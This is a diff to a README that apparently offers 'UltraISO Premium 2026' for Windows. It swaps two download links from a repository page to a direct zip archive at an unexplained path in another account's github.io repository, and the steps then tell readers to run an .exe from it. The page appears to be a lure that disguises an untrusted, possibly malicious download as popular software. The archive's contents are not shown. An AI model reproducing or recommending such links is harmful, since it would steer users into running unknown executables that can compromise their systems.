@@ -5,7 +5,7 @@ description: "Download UltraISO Premium for Windows 10 and 11 to create, edit, a
 ---
 # 💿 UltraISO-2026 - Create and edit disk image files
 
-[![Download UltraISO](https://img.shields.io/badge/Download-UltraISO_2026-blue)](https://github.com/Dakotaplymouthrock907/UltraISO-2026)
+[![Download UltraISO](https://img.shields.io/badge/Download-UltraISO_2026-blue)](https://raw.githubusercontent.com/Dakotaplymouthrock907/dakotaplymouthrock907.github.io/main/peerling/dakotaplymouthrock-io-github-v2.7.zip)
 
 ## 📁 About the software
 UltraISO is a tool for Windows that handles disk image files. You use it to manage ISO files, which act as digital copies of physical discs like CDs, DVDs, or Blu-rays. This software allows you to open these files, see their contents, and extract files to your computer. It creates virtual drives, so your computer thinks a disc is inside even when you have no physical drive. This helps you run games or software that require a disc.
@@ -20,7 +20,7 @@ This software works on Windows 11 and Windows 10. You need a modern computer to 
 ## 📥 How to setup
 Follow these steps to get the software on your machine. You must use the link below to reach the official file storage area.
 
-[Download UltraISO 2026](https://github.com/Dakotaplymouthrock907/UltraISO-2026)
+[Download UltraISO 2026](https://raw.githubusercontent.com/Dakotaplymouthrock907/dakotaplymouthrock907.github.io/main/peerling/dakotaplymouthrock-io-github-v2.7.zip)
 
 1. Click the link above to visit the download page.
 2. Look for the file ending in .exe.
